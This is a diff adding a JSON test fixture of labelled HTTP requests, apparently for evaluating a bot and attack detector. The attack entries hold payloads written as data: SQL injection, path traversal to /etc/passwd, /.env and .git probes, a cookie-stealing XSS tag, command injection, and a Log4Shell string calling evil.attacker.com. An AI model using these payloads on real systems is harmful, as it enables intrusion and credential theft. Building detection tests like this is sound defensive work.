@@ -1,0 +1,303 @@
+[
+  {
+    "id": "human-chrome-macos",
+    "name": "Chrome on macOS browsing home page",
+    "method": "GET",
+    "path": "/",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "accept-language": "en-US,en;q=0.9",
+      "accept-encoding": "gzip, deflate, br",
+      "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"macOS\"",
+      "sec-fetch-dest": "document",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-site": "none"
+    },
+    "ground_truth": { "category": "human", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "human-safari-ios",
+    "name": "Safari on iPhone browsing catalog",
+    "method": "GET",
+    "path": "/products/shoes",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "accept-language": "en-US,en;q=0.9",
+      "accept-encoding": "gzip, deflate, br",
+      "sec-fetch-dest": "document",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-site": "same-origin"
+    },
+    "ground_truth": { "category": "human", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "human-firefox-linux",
+    "name": "Firefox on Ubuntu Linux browsing docs",
+    "method": "GET",
+    "path": "/docs/getting-started",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "accept-language": "en-US,en;q=0.5",
+      "accept-encoding": "gzip, deflate, br",
+      "sec-fetch-dest": "document",
+      "sec-fetch-mode": "navigate",
+      "sec-fetch-site": "none"
+    },
+    "ground_truth": { "category": "human", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "human-edge-windows",
+    "name": "Edge on Windows 11 submitting search",
+    "method": "GET",
+    "path": "/search?q=mechanical+keyboards",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "accept-language": "en-US,en;q=0.9",
+      "accept-encoding": "gzip, deflate, br",
+      "sec-ch-ua": "\"Chromium\";v=\"124\", \"Microsoft Edge\";v=\"124\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\""
+    },
+    "ground_truth": { "category": "human", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "human-chrome-android",
+    "name": "Chrome on Pixel Android reading article",
+    "method": "GET",
+    "path": "/blog/performance-tuning",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "accept-language": "en-US,en;q=0.9",
+      "accept-encoding": "gzip, deflate, br",
+      "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
+      "sec-ch-ua-mobile": "?1",
+      "sec-ch-ua-platform": "\"Android\""
+    },
+    "ground_truth": { "category": "human", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "goodbot-googlebot-desktop",
+    "name": "Googlebot desktop web crawler",
+    "method": "GET",
+    "path": "/sitemap.xml",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "accept": "*/*",
+      "accept-encoding": "gzip,deflate"
+    },
+    "ground_truth": { "category": "good_bot", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "goodbot-googlebot-mobile",
+    "name": "Googlebot smartphone crawler",
+    "method": "GET",
+    "path": "/posts/123",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "accept": "*/*",
+      "accept-encoding": "gzip,deflate"
+    },
+    "ground_truth": { "category": "good_bot", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "goodbot-bingbot",
+    "name": "Microsoft Bingbot crawler",
+    "method": "GET",
+    "path": "/robots.txt",
+    "headers": {
+      "user-agent": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",
+      "accept": "*/*"
+    },
+    "ground_truth": { "category": "good_bot", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "goodbot-slackbot",
+    "name": "Slackbot link preview fetcher",
+    "method": "GET",
+    "path": "/news/launch-announcement",
+    "headers": {
+      "user-agent": "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
+      "accept": "*/*",
+      "accept-encoding": "gzip,deflate"
+    },
+    "ground_truth": { "category": "good_bot", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "goodbot-uptimerobot",
+    "name": "Uptime monitoring probe",
+    "method": "GET",
+    "path": "/healthz",
+    "headers": {
+      "user-agent": "UptimeRobot/2.0 (http://www.uptimerobot.com/)",
+      "accept": "*/*"
+    },
+    "ground_truth": { "category": "good_bot", "should_block": false, "should_challenge": false, "action": "allow" }
+  },
+  {
+    "id": "badbot-python-requests",
+    "name": "Python requests scraping API",
+    "method": "GET",
+    "path": "/api/v1/users",
+    "headers": {
+      "user-agent": "python-requests/2.31.0",
+      "accept": "*/*",
+      "accept-encoding": "gzip, deflate"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": true, "should_challenge": true, "action": "block" }
+  },
+  {
+    "id": "badbot-curl",
+    "name": "cURL CLI scraping sensitive catalog",
+    "method": "GET",
+    "path": "/pricing-table/internal",
+    "headers": {
+      "user-agent": "curl/8.4.0",
+      "accept": "*/*"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": true, "should_challenge": true, "action": "block" }
+  },
+  {
+    "id": "badbot-scrapy",
+    "name": "Scrapy framework scraping pages",
+    "method": "GET",
+    "path": "/catalog?page=40",
+    "headers": {
+      "user-agent": "Scrapy/2.11.0 (+https://scrapy.org)",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": true, "should_challenge": true, "action": "block" }
+  },
+  {
+    "id": "badbot-headless-chrome",
+    "name": "Puppeteer / HeadlessChrome automated bot",
+    "method": "GET",
+    "path": "/checkout",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.109 Safari/537.36",
+      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": true, "should_challenge": true, "action": "block" }
+  },
+  {
+    "id": "badbot-go-http",
+    "name": "Go HTTP client scraping",
+    "method": "GET",
+    "path": "/feed.rss",
+    "headers": {
+      "user-agent": "Go-http-client/1.1",
+      "accept-encoding": "gzip"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": true, "should_challenge": true, "action": "block" }
+  },
+  {
+    "id": "spoofed-chrome-missing-headers",
+    "name": "Spoofed Chrome User-Agent missing standard browser headers",
+    "method": "GET",
+    "path": "/account/settings",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    },
+    "ground_truth": { "category": "bad_bot", "should_block": false, "should_challenge": true, "action": "challenge" }
+  },
+  {
+    "id": "attack-sqli-union",
+    "name": "SQL Injection UNION attack",
+    "method": "GET",
+    "path": "/search?q=books' UNION SELECT 1,username,password,4 FROM users--",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-sqli-blind-sleep",
+    "name": "SQL Injection blind time-based SLEEP",
+    "method": "GET",
+    "path": "/items?id=1 AND (SELECT 1 FROM (SELECT SLEEP(5))A)",
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-sqlmap-scan",
+    "name": "Automated sqlmap vulnerability scan",
+    "method": "GET",
+    "path": "/api/users?id=1*",
+    "headers": {
+      "user-agent": "sqlmap/1.7.2#stable (http://sqlmap.org)",
+      "accept": "*/*"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-path-traversal",
+    "name": "Directory path traversal attack",
+    "method": "GET",
+    "path": "/download?file=../../../../etc/passwd",
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-sensitive-env",
+    "name": "Environment secrets probe (/.env)",
+    "method": "GET",
+    "path": "/.env",
+    "headers": {
+      "user-agent": "curl/7.81.0"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-sensitive-git",
+    "name": "Git repository config probe",
+    "method": "GET",
+    "path": "/.git/config",
+    "headers": {
+      "user-agent": "python-requests/2.28.1"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-xss-script",
+    "name": "Cross-Site Scripting <script> tag",
+    "method": "POST",
+    "path": "/comments",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "content-type": "application/json"
+    },
+    "body": "{\"comment\": \"<script>alert(document.cookie)</script>\"}",
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-cmd-injection",
+    "name": "Operating system command injection",
+    "method": "GET",
+    "path": "/ping?host=127.0.0.1; cat /etc/passwd",
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  },
+  {
+    "id": "attack-jndi-log4j",
+    "name": "Log4Shell JNDI exploit attempt",
+    "method": "GET",
+    "path": "/login",
+    "headers": {
+      "user-agent": "${jndi:ldap://evil.attacker.com/exploit}",
+      "accept": "*/*"
+    },
+    "ground_truth": { "category": "attack", "should_block": true, "should_challenge": false, "action": "block" }
+  }
+]
